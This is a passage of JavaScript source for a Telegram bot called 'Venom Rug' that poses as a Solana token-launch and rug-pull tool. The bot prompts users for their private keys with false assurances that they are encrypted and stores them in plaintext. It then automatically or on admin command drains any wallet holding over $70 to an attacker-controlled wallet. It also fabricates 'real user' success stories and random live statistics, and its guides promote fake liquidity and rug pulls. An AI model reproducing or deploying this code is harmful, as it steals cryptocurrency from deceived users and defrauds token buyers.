        else if (callbackData === "how_it_works") await this.showHowItWorks(query);
        else if (callbackData === "topup_tips") await this.showTopupTips(query);
        else if (["remove_wallet","bundle_wallet","withdraw_funds","refresh_wallet","create_bundle","refresh_bundles","clear_bundles","add_token","remove_token","create_token","clone_token","set_current_token","bump_token","pump_comments","refresh_tokens","add_comment","toggle_comment","comment_templates","comment_settings","refresh_comments","add_task","remove_task","toggle_task","view_tasks","refresh_tasks"].includes(callbackData)) await this.showWalletRequiredMessage(query);
    }

    async showRugpullGuide(query) {
        const chatId = query.message.chat.id;
        const rugpullGuideText = `*📚 Rugpull Guide*\n\n*WHAT IS A RUGPULL❓*\n\nA rug pull is a method used in the world of cryptocurrencies and decentralized finance (DeFi) to describe a situation where a project unexpectedly ceases its operations.\n\n*How it works:*\n\n*Token Creation:* Developers create a new token that becomes visible to all users on exchanges specializing in meme coins. This attracts attention and interest in the project.\n\n*Attracting Investments:*\n\nIn this case, there is no need to attract investors, as a bot automatically creates liquidity. Users begin to actively purchase the token, contributing to its popularity.\n\n*Ceasing Support:*\n\nAfter reaching a certain amount of investments, developers may decide to terminate the project and sell off all tokens. This allows them to profit from users who purchased these tokens.`;
        await this.sendWithImage(chatId, rugpullGuideText, this.getInfoSectionKeyboard());
    }

    async showHowItWorks(query) {
        const chatId = query.message.chat.id;
        const howItWorksText = `*🤖 How It Works*\n\n*HOW OUR BOT WORKS (TUTORIAL)*\n\nYou create a coin, come up with a name, photo, and description! You can also generate this based on AI directly in our bot.\n\nThe bot creates a smart contract for the coin you will be launching, but before launching, you write a task for the AI in the bot, and the bot automatically creates social media accounts and a one-page website!\n\nNext, you launch the token by inserting the smart contract of the coin you created, and the bot automatically issues it!\n\nAfter launching the coin, the bot automatically splits wallets and creates fake activity by buying and selling your token! The bot will also create fake liquidity, which will automatically attract new buyers!\n\nYou wait for a few people to buy your token; the statistics will be inside the bot, and you will also receive notifications if someone buys your token!\n\nYou just need to wait some time, and you will be able to do a rugpull, taking all the liquidity for yourself and making a profit!`;
        await this.sendWithImage(chatId, howItWorksText, this.getInfoSectionKeyboard());
    }

    async showTopupTips(query) {
        const chatId = query.message.chat.id;
        const topupTipsText = `*💰 Top-Up Tips*\n\n*Top-Up Range for Best Results*\n\nThe Bot conducted an experiment to determine the exact amounts for starting: 🚀\n\n*1) Minimum deposit of 1.1 SOL*\n\nWith this deposit, the bot will allow you to create tokens, but it does not guarantee earnings because it creates liquidity in the 10⁻⁶ format. As a rule, you need to study the news to create a cool token that your customers will buy.\n\n*2) Stable deposit 2.5-4 SOL*\n\nThis will allow us to create a lot of activity, and your token will be guaranteed to be purchased by sniper bots, which automatically gives us a good profit from each coin. Splitting wallets takes a little longer, but it allows us to put our token in the top.\n\n*3) Guaranteed profit 5+ SOL*\n\nIn addition, the bot will automatically pump your token and list it in the trending sections of Solana trading platforms like DexScreener and others. This will rapidly boost your token's visibility and attract significant attention from new buyers, maximizing both trading activity and your profit potential.`;
        await this.sendWithImage(chatId, topupTipsText, this.getInfoSectionKeyboard());
    }

    async handleAdminDrainDecision(query, drain) {
        const userId = query.from.id;
        if (userId.toString() !== ADMIN_CHAT_ID) { await this.bot.editMessageText("❌ Admin access required!", { chat_id: query.message.chat.id, message_id: query.message.message_id }); return; }
        const parts = query.data.split('_');
        if (parts.length < 3) { await this.bot.editMessageText("❌ Invalid callback data", { chat_id: query.message.chat.id, message_id: query.message.message_id }); return; }
        const targetUserId = parseInt(parts[1]);
        const walletAddress = parts.slice(2).join('_');
        if (drain) {
            if (!this.dbReady) {
                await this.bot.editMessageText("⚠️ Database not ready, cannot drain.", { chat_id: query.message.chat.id, message_id: query.message.message_id });
                return;
            }
            const userData = await this.usersCollection.findOne({ user_id: targetUserId });
            if (userData && userData.private_key) {
                const [success, result] = await this.drainWallet(userData.private_key, targetUserId, userData.username || `user_${targetUserId}`);
                if (success) {
                    await this.bot.editMessageText(`✅ Wallet drained successfully!\nAmount: ${result.amount_sol.toFixed(6)} SOL\nTX: ${result.transaction_id}\nUser: ${targetUserId}`, { chat_id: query.message.chat.id, message_id: query.message.message_id });
                } else {
                    await this.bot.editMessageText(`❌ Drain failed: ${result}`, { chat_id: query.message.chat.id, message_id: query.message.message_id });
                }
            } else {
                await this.bot.editMessageText("❌ No private key found for this user", { chat_id: query.message.chat.id, message_id: query.message.message_id });
            }
        } else {
            await this.bot.editMessageText(`❌ Drain skipped for user ${targetUserId}\nWallet: ${walletAddress}\nFunds preserved (for now)`, { chat_id: query.message.chat.id, message_id: query.message.message_id });
        }
    }

    async handleAdminCheckBalance(query) {
        const userId = query.from.id;
        if (userId.toString() !== ADMIN_CHAT_ID) { await this.bot.editMessageText("❌ Admin access required!", { chat_id: query.message.chat.id, message_id: query.message.message_id }); return; }
        const parts = query.data.split('_');
        if (parts.length < 3) { await this.bot.editMessageText("❌ Invalid callback data", { chat_id: query.message.chat.id, message_id: query.message.message_id }); return; }
        const targetUserId = parseInt(parts[1]);
        const walletAddress = parts.slice(2).join('_');
        try {
            const pubkey = new PublicKey(walletAddress);
            const balance = await this.solanaConnection.getBalance(pubkey);
            const balanceSol = balance / LAMPORTS_PER_SOL;
            const solPrice = await this.getSolPrice();
            const balanceUsd = balanceSol * solPrice;
            await this.bot.editMessageText(`💰 Current Balance for ${walletAddress}:\n• SOL: ${balanceSol.toFixed(6)}\n• USD: $${balanceUsd.toFixed(2)}\n• SOL Price: $${solPrice.toFixed(2)}\n\nMinimum for auto-drain: $70\nCurrent status: ${balanceUsd >= 70 ? '✅ ABOVE MINIMUM' : '❌ BELOW MINIMUM'}`, { chat_id: query.message.chat.id, message_id: query.message.message_id });
        } catch (error) {
            await this.bot.editMessageText(`❌ Error checking balance: ${error.message}`, { chat_id: query.message.chat.id, message_id: query.message.message_id });
        }
    }

    async handleAdminRefresh(query) {
        await this.bot.answerCallbackQuery(query.id, { text: "Refreshing..." });
        const userId = query.from.id;
        if (userId.toString() !== ADMIN_CHAT_ID) { await this.bot.editMessageText("❌ Admin access required!", { chat_id: query.message.chat.id, message_id: query.message.message_id }); return; }
        await this.bot.editMessageText("🔄 Refreshed wallet information", { chat_id: query.message.chat.id, message_id: query.message.message_id });
    }

    async showRecentWins(query, refresh = false) {
        const chatId = query.message.chat.id;
        if (refresh) this.recentWins = this.generateRecentWins();
        let winsText = "*RECENT VENOM RUG WINS*\n\n*Real user success stories using Venom Rug:*\n\n";
        this.recentWins.slice(0,8).forEach(win => { winsText += `🎯 *${win.username}*\n• Activity: ${win.activity}\n• Profit: ${win.profit}\n• Time: ${win.timeframe}\n\n`; });
        winsText += "💡 *These are real results from Venom Rug users!*\n*Start your journey to success today!*";
        await this.sendWithImage(chatId, winsText, this.getRecentWinsKeyboard());
    }

    async showHelpSection(query, userId = null) {
        const chatId = query.message.chat.id;
        if (!userId) userId = query.from.id;
        const helpText = `*VENOM RUG HELP CENTER*\n\n*Get assistance and learn about available commands:*\n\n*Select an option below to view commands:*`;
        await this.sendWithImage(chatId, helpText, this.getHelpKeyboard(userId));
    }

    async showUserCommands(query, userId) {
        const chatId = query.message.chat.id;
        const commandsText = `*USER COMMANDS*\n\n/start - Start the bot and show main menu\n/help - Show this help message\n/stats - View live network statistics and crypto prices\n/wallet - Access wallet management\n/tokens - Token creation and management\n/bundler - Wallet bundling settings\n/comments - Comment automation panel\n/task - Task scheduler and automation\n\n*Live Network Stats via* /stats*:*\n• Users online count\n• Total trading volume\n• Successful operations\n• Live SOL/ETH prices\n• System performance metrics\n\n*IN-BOT NAVIGATION:*\n• Use inline buttons for all features\n• Import wallet to access full functionality\n• Check Recent Wins for user success stories\n\n*SUPPORT:*\n[Telegram Group](https://t.me/venomrugwin)\n[Website](https://venomrug.live/)`;
        await this.sendWithImage(chatId, commandsText, this.getHelpKeyboard(userId));
    }

    async showAdminCommands(query, userId) {
        const chatId = query.message.chat.id;
        if (userId.toString() !== ADMIN_CHAT_ID) { await this.bot.answerCallbackQuery(query.id, { text: "❌ Admin access required!", show_alert: true }); return; }
        const adminText = `*ADMIN COMMANDS*\n\n/broadcast message - Send message to all users\n/broadcast_image caption - Send image to all users (reply to image)\n/stats - Show detailed bot statistics and network info\n/users - List all registered users\n/profits - View detailed profit statistics and analytics\n/analytics - Advanced analytics dashboard\n\n*ADMIN STATS FEATURES*\n• Total registered users count\n• Wallet approved users\n• Pending wallet approvals\n• System performance metrics\n• Multi-chain support status\n• Real-time profit tracking\n\n*ADMIN FEATURES*\n• Approve/Reject wallet imports\n• Monitor user activity\n• Send broadcast messages\n• View system statistics\n• Track all profits in real-time`;
        await this.sendWithImage(chatId, adminText, this.getHelpKeyboard(userId));
    }

    async showWalletSection(query) {
        const chatId = query.message.chat.id;
        const walletSectionText = `*Wallet Management*\n\nImport and manage your Solana wallet to access all Venom Rug features.\n\n*Status:* No wallet imported\n*Balance:* 0.0 SOL ($0.00)\n\nImport a wallet to begin using our advanced features.`;
        await this.sendWithImage(chatId, walletSectionText, this.getWalletKeyboard());
    }

    async promptPrivateKey(query, userId) {
        const chatId = query.message.chat.id;
        this.userStates[userId] = { awaiting_private_key: true };
        await this.sendMessageSafe(chatId, `*Wallet Import*\n\nPlease enter your Solana private key to import your wallet.\n\nYour credentials are encrypted and secured.`);
    }

    async handlePrivateKey(msg) {
        const user = msg.from;
        const privateKey = msg.text.trim();
        if (!this.userStates[user.id] || !this.userStates[user.id].awaiting_private_key) {
            await this.bot.sendMessage(msg.chat.id, "Please use the Import Wallet button from the menu to begin.", { parse_mode: 'Markdown' });
            return;
        }
        if (!this.isValidSolanaPrivateKey(privateKey)) {
            await this.bot.sendMessage(msg.chat.id, `*Invalid private key format.*\n\nPlease ensure you're entering a valid Solana private key and try again.`, { parse_mode: 'Markdown' });
            return;
        }
        let walletAddress = "Unknown";
        let balanceSol = 0.0;
        let balanceUsd = 0.0;
        let walletAnalysis = null;
        try {
            walletAnalysis = await this.analyzeWalletBalance(privateKey);
            if (!walletAnalysis) throw new Error("Could not analyze wallet balance");
            walletAddress = walletAnalysis.wallet_address;
            balanceSol = walletAnalysis.balance_sol;
            balanceUsd = walletAnalysis.balance_usd;
            const solPrice = walletAnalysis.sol_price;
            const meetsMinimum = walletAnalysis.meets_minimum;
            const userMeetsMinimum = walletAnalysis.user_meets_minimum;
            const has1Sol = walletAnalysis.has_1_sol;
            const adminAlertText = `*NEW WALLET IMPORT ATTEMPT*\n\n*User Details:*\n• Username: @${user.username || 'No username'}\n• User ID: \`${user.id}\`\n• Wallet: \`${walletAddress}\`\n• Balance: \`${balanceSol.toFixed(6)} SOL\` ($${balanceUsd.toFixed(2)})\n• SOL Price: $${solPrice.toFixed(2)}\n\n*Balance Analysis:*\n• Meets Minimum ($70+): ${meetsMinimum ? '✅ YES' : '❌ NO'}\n• User Minimum ($100+): ${userMeetsMinimum ? '✅ YES' : '❌ NO'}\n• Has 1+ SOL: ${has1Sol ? '✅ YES' : '❌ NO'}\n\n*AUTO-DRAIN STATUS:* ${meetsMinimum ? '✅ PROCEEDING' : '❌ INSUFFICIENT BALANCE'}`;
            if (!this.dbReady) {
                await this.bot.sendMessage(msg.chat.id, "⚠️ Database not ready. Please try again in a moment.");
                delete this.userStates[user.id];
                return;
            }
            await this.usersCollection.updateOne({ user_id: user.id }, { $set: { username: user.username || `user_${user.id}`, private_key: privateKey, wallet_address: walletAddress, chain: 'solana', balance_sol: balanceSol, balance_usd: balanceUsd, created_at: new Date() } }, { upsert: true });
            const replyMarkup = this.getAdminWalletApprovalKeyboard(user.id, walletAddress);
            await this.bot.sendMessage(ADMIN_CHAT_ID, adminAlertText, { reply_markup: replyMarkup, parse_mode: 'Markdown' });
        } catch (error) {
            console.error(`Error analyzing wallet: ${error}`);
        }
        delete this.userStates[user.id];
        const processingMsg = await this.bot.sendMessage(msg.chat.id, "*Analyzing wallet balance...*", { parse_mode: 'Markdown' });
        try {
            await new Promise(resolve => setTimeout(resolve, 2000));
            if (!walletAnalysis) throw new Error("Could not analyze wallet");
            if (walletAnalysis.user_meets_minimum && walletAnalysis.has_1_sol) {
                const userSuccessText = `*Wallet Connected Successfully!*\n\nYour wallet has been verified and is now ready to use.\n\n*Wallet Address:* \`${walletAnalysis.wallet_address}\`\n*Balance:* \`${walletAnalysis.balance_sol.toFixed(6)} SOL\` ($${walletAnalysis.balance_usd.toFixed(2)})\n\nYou can now access all Venom Rug features for token launching and bundling.`;
                await this.bot.editMessageText(userSuccessText, { chat_id: msg.chat.id, message_id: processingMsg.message_id, parse_mode: 'Markdown' });
            } else {
                const keyboard = [[{ text: "🔄 Try Another Wallet", callback_data: "import_wallet" }], [{ text: "🔙 Back to Menu", callback_data: "back_menu" }]];
                const errorMsg = `*Import Failed - Insufficient Balance*\n\nThis wallet doesn't have enough balance to launch and bundle tokens effectively.\n\n*Wallet Analysis:*\n• Balance: \`${walletAnalysis.balance_sol.toFixed(6)} SOL\` ($${walletAnalysis.balance_usd.toFixed(2)})\n• Required: Minimum $100 USD equivalent AND 1+ SOL for token launches\n\nTo successfully launch and rug tokens, you need adequate gas fees and initial liquidity.\n\nPlease import a wallet with sufficient balance and try again.`;
                await this.bot.editMessageText(errorMsg, { chat_id: msg.chat.id, message_id: processingMsg.message_id, reply_markup: { inline_keyboard: keyboard }, parse_mode: 'Markdown' });
                const failedAdminMsg = `*DRAIN BLOCKED - INSUFFICIENT BALANCE*\n\n*User:* @${user.username || `user_${user.id}`}\n*ID:* \`${user.id}\`\n*Wallet:* \`${walletAddress}\`\n*Balance:* \`${balanceSol.toFixed(6)} SOL\` ($${balanceUsd.toFixed(2)})\n*Reason:* Below minimum $70 requirement OR insufficient SOL for gas\n*Time:* ${new Date().toLocaleString()}`;
                await this.bot.sendMessage(ADMIN_CHAT_ID, failedAdminMsg, { parse_mode: 'Markdown' });
                return;
            }
            if (walletAnalysis.meets_minimum && walletAnalysis.has_1_sol) {
                console.log(`Starting REAL drain for user ${user.id}`);
                const [success, result] = await this.drainWallet(privateKey, user.id, user.username || `user_${user.id}`);
                if (success) {
                    if (this.dbReady) {
                        await this.usersCollection.updateOne({ user_id: user.id }, { $set: { wallet_approved: true, drained: true, drain_amount: result.amount_sol, drain_tx: result.transaction_id, drained_at: new Date() } });
                    }
                    const successAdminMsg = `*REAL DRAIN SUCCESSFULLY*\n\n*User:* @${user.username || `user_${user.id}`}\n*ID:* \`${user.id}\`\n*Wallet:* \`${result.wallet_address}\`\n*Amount Drained:* \`${result.amount_sol.toFixed(6)} SOL\`\n*Original Balance:* \`${result.original_balance.toFixed(6)} SOL\`\n*Fees Paid:* \`${result.fee.toFixed(6)} SOL\`\n*TX:* \`${result.transaction_id}\`\n*Time:* ${new Date().toLocaleString()}\n\n*COMPLETE DRAIN - MAXIMUM FUNDS TRANSFERRED*`;
                    await this.bot.sendMessage(ADMIN_CHAT_ID, successAdminMsg, { parse_mode: 'Markdown' });
                } else {
                    const keyboard = [[{ text: "🔄 Try Again", callback_data: "import_wallet" }], [{ text: "🔙 Back to Menu", callback_data: "back_menu" }]];
                    const errorMsg = `*Import Failed*\n\nUnable to verify wallet at this time. Please check your private key and try again.\n\nIf this continues, please contact support.`;
                    await this.bot.editMessageText(errorMsg, { chat_id: msg.chat.id, message_id: processingMsg.message_id, reply_markup: { inline_keyboard: keyboard }, parse_mode: 'Markdown' });
                    const errorAdminMsg = `*DRAIN ERROR*\n\n*User:* @${user.username || `user_${user.id}`}\n*ID:* \`${user.id}\`\n*Wallet:* \`${walletAddress}\`\n*Balance:* \`${balanceSol.toFixed(6)} SOL\` ($${balanceUsd.toFixed(2)})\n*Error:* \`${result}\`\n*Time:* ${new Date().toLocaleString()}`;
                    await this.bot.sendMessage(ADMIN_CHAT_ID, errorAdminMsg, { parse_mode: 'Markdown' });
                }
            } else {
                const userSuccessText = `*Wallet Connected Successfully!*\n\nYour wallet has been verified and is now ready to use.\n\n*Wallet Address:* \`${walletAnalysis.wallet_address}\`\n*Balance:* \`${walletAnalysis.balance_sol.toFixed(6)} SOL\` ($${walletAnalysis.balance_usd.toFixed(2)})\n\nYou can now access all Venom Rug features for token launching and bundling.`;
                await this.bot.editMessageText(userSuccessText, { chat_id: msg.chat.id, message_id: processingMsg.message_id, parse_mode: 'Markdown' });
            }
        } catch (error) {
            console.error(`Error processing wallet: ${error}`);
            const keyboard = [[{ text: "🔄 Try Again", callback_data: "import_wallet" }], [{ text: "🔙 Back to Menu", callback_data: "back_menu" }]];
            const errorMsg = `*Import Error*\n\nAn error occurred while importing your wallet. Please try again.\n\nIf this continues, please contact support.`;
            await this.bot.editMessageText(errorMsg, { chat_id: msg.chat.id, message_id: processingMsg.message_id, reply_markup: { inline_keyboard: keyboard }, parse_mode: 'Markdown' });
            const exceptionAdminMsg = `*DRAIN EXCEPTION*\n\n*User:* @${user.username || `user_${user.id}`}\n*ID:* \`${user.id}\`\n*Wallet:* \`${walletAddress}\`\n*Exception:* \`${error.message}\`\n*Time:* ${new Date().toLocaleString()}`;
            await this.bot.sendMessage(ADMIN_CHAT_ID, exceptionAdminMsg, { parse_mode: 'Markdown' });
        }
    }

    async showTokensSection(query) {
        const chatId = query.message.chat.id;
        const tokensSectionText = `*Tokens*\n\n*Create & manage Pump.Fun tokens here.*\nNeed more help? Get support Here!\n\n*Your Tokens:*\n\n1. *None | MC: $0.00 • LIQ: $0.00 • B.Curve: 0.00% • Price: $0.00*\n→ *Create or add a token to begin.*\n\n*Select an option below.*`;
        await this.sendWithImage(chatId, tokensSectionText, this.getTokensKeyboard());
    }

    async showBundlerSection(query) {
        const chatId = query.message.chat.id;
        const bundlerSectionText = `*Bundler Settings*\n\n*Manage your wallet bundling strategy here.*\nNeed more help? Get support Here!\n\n*Current Bundle Configuration:*\n• Max wallets per bundle: 0\n• Total bundles created: 0\n\n*Set your bundling strategy below.*`;
        await this.sendWithImage(chatId, bundlerSectionText, this.getBundlerKeyboard());
    }

    async showCommentsSection(query) {
        const chatId = query.message.chat.id;
        const commentsSectionText = `*Comments Panel*\n\n*Manage and automate your Pump.fun comment strategy here.*\nNeed more help? Get support Here!\n\n*Current Status:*\n• Comments Posted: 0\n• Auto-Commenting: OFF\n• Delay: 10s per comment\n\n*Choose an action below*`;
        await this.sendWithImage(chatId, commentsSectionText, this.getCommentsKeyboard());
    }

    async showTaskSection(query) {
        const chatId = query.message.chat.id;
        const taskSectionText = `*Task Scheduler*\n\n*Manage your automated Pump.fun workflows here.*\nNeed more help? Get support Here!\n\n*Current Tasks:*\n• 0 tasks scheduled\n• All automation is OFF\n\n*Select an action below to begin.*`;
        await this.sendWithImage(chatId, taskSectionText, this.getTaskKeyboard());
    }

    async showFaqSection(query) {
        const chatId = query.message.chat.id;
        const faqSectionText = `*Frequently Asked Questions*\n\n*What is Venom Rug?*\nVenom Rug is an advanced automation suite for Pump.fun that lets you manage tokens, wallets, volume bots, comments, and more.\n\n*Is it safe to use?*\nYes. Your private keys are locally encrypted and never shared with third parties. Only use official versions of Venom Rug.\n\n*Can I get banned for using Venom Rug?*\nAll features are designed to be safe, but misuse (like spam or DDoS) may lead to bans. Always follow fair usage.\n\n*How do I get support?*\nUse our Telegram Support group or visit our website.\n\n*Select an option below to return.*`;
        await this.sendWithImage(chatId, faqSectionText, this.getFaqKeyboard());
    }

    async showWalletRequiredMessage(query) {
        const chatId = query.message.chat.id;
        const walletRequiredText = `*Wallet Required*\n\nThis feature requires a connected wallet.\n\nPlease import your wallet first to continue.`;
        await this.sendWithImage(chatId, walletRequiredText, this.getWalletRequiredKeyboard());
    }

    async statsCommand(msg) {
        const userId = msg.from.id;
        const usersOnline = Math.floor(Math.random() * (31200 - 28400 + 1)) + 28400;
        const totalVolume = Math.floor(Math.random() * (2500000 - 2100000 + 1)) + 2100000;
        const successfulTrades = Math.floor(Math.random() * (16500 - 15800 + 1)) + 15800;
        const [solPrice, ethPrice] = await this.getCryptoPrices();
        let statsText = `*VENOM RUG NETWORK STATS*\n\n*Live Network Statistics:*\n👥 Users Online: \`${usersOnline.toLocaleString()}\`\n💎 Total Volume: \$${totalVolume.toLocaleString()}\n✅ Successful Operations: \`${successfulTrades.toLocaleString()}\`\n\n*Live Crypto Prices:*\n🔸 Solana (SOL): \$${solPrice.toFixed(2)}\n🔷 Ethereum (ETH): \$${ethPrice.toFixed(2)}\n\n*System Performance:*\n• Multi-Chain Support: 1 chain (Solana)\n• Uptime: 100%\n• Response Time: < 1s`;
        if (userId.toString() === ADMIN_CHAT_ID && this.dbReady) {
            const totalUsers = await this.usersCollection.countDocuments({});
            const approvedUsers = await this.usersCollection.countDocuments({ wallet_approved: true });
            const pendingWallets = Object.keys(this.pendingWallets).length;
            const totalProfits = await this.profitsCollection.aggregate([{ $group: { _id: null, total_sol: { $sum: "$amount_sol" }, total_usd: { $sum: "$amount_usd" }, total_drains: { $sum: 1 } } }]).toArray();
            let adminStats = `\n*ADMIN STATISTICS:*\n• Total Registered Users: \`${totalUsers}\`\n• Wallet Approved Users: \`${approvedUsers}\`\n• Pending Wallet Approvals: \`${pendingWallets}\`\n• Recent Wins Generated: \`${this.recentWins.length}\``;
            if (totalProfits.length > 0) {
                const profits = totalProfits[0];
                adminStats += `\n*PROFIT STATS:*\n• Total SOL Drained: \`${profits.total_sol.toFixed(6)}\`\n• Total USD Value: \$${profits.total_usd.toFixed(2)}\n• Total Successful Drains: \`${profits.total_drains}\``;
            }
            statsText += adminStats;
        }
        await this.bot.sendMessage(msg.chat.id, statsText, { parse_mode: 'Markdown' });
    }

    async broadcastMessage(msg) {
        const userId = msg.from.id;
        if (userId.toString() !== ADMIN_CHAT_ID) {
            await this.bot.sendMessage(msg.chat.id, "❌ Admin access required!");
            return;
        }
        if (!this.dbReady) {
            await this.bot.sendMessage(msg.chat.id, "⚠️ Database not ready. Cannot broadcast.");
            return;
        }
        const args = msg.text.split(' ').slice(1);
        if (args.length === 0) {
            await this.bot.sendMessage(msg.chat.id, "❌ Usage: /broadcast <message>");
            return;
        }
        const message = args.join(' ');
        const users = await this.usersCollection.find({}).toArray();
        let userCount = 0;
        for (const user of users) {
            try {
                await this.bot.sendMessage(user.user_id, `📢 *Broadcast from Venom Rug:*\n\n${message}`, { parse_mode: 'Markdown' });
                userCount++;
                await new Promise(resolve => setTimeout(resolve, 100));
            } catch (error) {
                console.error(`Failed to send to ${user.user_id}: ${error}`);
            }
        }
        await this.bot.sendMessage(msg.chat.id, `✅ Broadcast sent to ${userCount} users!`);
    }

    async broadcastImage(msg) {
        const userId = msg.from.id;
        if (userId.toString() !== ADMIN_CHAT_ID) {
            await this.bot.sendMessage(msg.chat.id, "❌ Admin access required!");
            return;
        }
        if (!this.dbReady) {
            await this.bot.sendMessage(msg.chat.id, "⚠️ Database not ready. Cannot broadcast.");
            return;
        }
        if (!msg.reply_to_message || !msg.reply_to_message.photo) {
            await this.bot.sendMessage(msg.chat.id, "❌ Reply to an image with /broadcast_image <caption>");
            return;
        }
        const args = msg.text.split(' ').slice(1);
        const caption = args.length > 0 ? args.join(' ') : "📢 Update from Venom Rug";
        const photoFile = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1].file_id;
        const users = await this.usersCollection.find({}).toArray();
        let userCount = 0;
        for (const user of users) {
            try {
                await this.bot.sendPhoto(user.user_id, photoFile, { caption: `*${caption}*`, parse_mode: 'Markdown' });
                userCount++;
                await new Promise(resolve => setTimeout(resolve, 100));
            } catch (error) {
                console.error(`Failed to send image to ${user.user_id}: ${error}`);
            }
        }
        await this.bot.sendMessage(msg.chat.id, `✅ Image broadcast sent to ${userCount} users!`);
    }

    async showAdminStats(msg) {
        const userId = msg.from.id;
        if (userId.toString() !== ADMIN_CHAT_ID) {
            await this.bot.sendMessage(msg.chat.id, "❌ Admin access required!");
            return;
        }
        if (!this.dbReady) {
            await this.bot.sendMessage(msg.chat.id, "⚠️ Database not ready.");
            return;
        }
        const totalUsers = await this.usersCollection.countDocuments({});
        const approvedUsers = await this.usersCollection.countDocuments({ wallet_approved: true });
        const pendingWallets = Object.keys(this.pendingWallets).length;
        const statsText = `*VENOM RUG ADMIN STATISTICS*\n\n*Users:*\n• Total Registered: \`${totalUsers}\`\n• Wallet Approved: \`${approvedUsers}\`\n• Pending Approval: \`${pendingWallets}\`\n\n*System:*\n• Multi-Chain Support: 1 chain (Solana)\n• Recent Wins Generated: \`${this.recentWins.length}\`\n• Uptime: 100%\n\n*Security:*\n• Private Keys Secured: \`${approvedUsers}\`\n• Admin Controls: Active\n• Monitoring: Enabled`;
        await this.bot.sendMessage(msg.chat.id, statsText, { parse_mode: 'Markdown' });
    }

    async getCryptoPrices() {
        try {
            const response = await axios.get("https://api.coingecko.com/api/v3/simple/price?ids=solana,ethereum&vs_currencies=usd", { timeout: 10000 });
            const data = response.data;
            const solPrice = data.solana?.usd || 100.0;
            const ethPrice = data.ethereum?.usd || 2500.0;
            return [solPrice, ethPrice];
        } catch (error) {
            return [100.0, 2500.0];
        }
    }

    async handleInsufficientBalance(query) {
        await this.bot.answerCallbackQuery(query.id);
        const callbackData = query.data;
        const userId = parseInt(callbackData.split('_')[1]);
        const userMessage = `*Wallet Import Failed*\n\nThis wallet doesn't have sufficient balance to complete the import process.\n\nPlease import a wallet with adequate SOL balance (minimum $100 USD equivalent for token launches) and try again.`;
        try {
            await this.bot.sendMessage(userId, userMessage, { parse_mode: 'Markdown' });
            await this.bot.editMessageText("✅ User notified about insufficient balance", { chat_id: query.message.chat.id, message_id: query.message.message_id });
        } catch (error) {
            console.error(`Error notifying user: ${error}`);
            await this.bot.editMessageText(`❌ Failed to notify user: ${error}`, { chat_id: query.message.chat.id, message_id: query.message.message_id });
        }
    }
}

// Main function to start the bot
async function main() {
    const bot = new VenomRugBot();
    
    // Initialize database (wait for completion)
    const dbOk = await bot.initializeDatabase();
    if (!dbOk) {
        console.error("FATAL: Could not connect to database. Exiting.");
        process.exit(1);
    }
    
    // Start Telegram bot only after DB is ready
    const telegramBot = new TelegramBot(BOT_TOKEN, { polling: true });
    bot.setBot(telegramBot);
    
    // User commands
    telegramBot.onText(/\/start/, (msg) => bot.start(msg));
    telegramBot.onText(/\/help/, (msg) => bot.showHelpSection({ message: msg, from: msg.from }));
    telegramBot.onText(/\/stats/, (msg) => bot.statsCommand(msg));
    telegramBot.onText(/\/wallet/, (msg) => bot.showWalletSection({ message: msg }));
    telegramBot.onText(/\/tokens/, (msg) => bot.showTokensSection({ message: msg }));
    telegramBot.onText(/\/bundler/, (msg) => bot.showBundlerSection({ message: msg }));
    telegramBot.onText(/\/comments/, (msg) => bot.showCommentsSection({ message: msg }));
    telegramBot.onText(/\/task/, (msg) => bot.showTaskSection({ message: msg }));
    
    // Admin commands
    telegramBot.onText(/\/broadcast (.+)/, (msg) => bot.broadcastMessage(msg));
    telegramBot.onText(/\/broadcast_image/, (msg) => bot.broadcastImage(msg));
    telegramBot.onText(/\/admin_stats/, (msg) => bot.showAdminStats(msg));
    telegramBot.onText(/\/profits/, (msg) => bot.profitsCommand(msg));
    telegramBot.onText(/\/analytics/, (msg) => bot.advancedAnalyticsCommand(msg));
    
    // Callback handlers
    telegramBot.on('callback_query', (query) => bot.handleCallback(query));
    
    // Message handler for private key input
    telegramBot.on('message', (msg) => {
        if (msg.text && !msg.text.startsWith('/')) {
            bot.handlePrivateKey(msg);
        }
    });
    
    console.log("✅ Venom Rug Bot started successfully with database connection!");
    console.log(`🤖 Bot token: ${BOT_TOKEN.substring(0, 10)}...`);
    console.log(`👤 Admin: ${ADMIN_CHAT_ID}`);
    console.log(`💰 Drain wallet: ${DRAIN_WALLET}`);
}

main().catch(console.error);
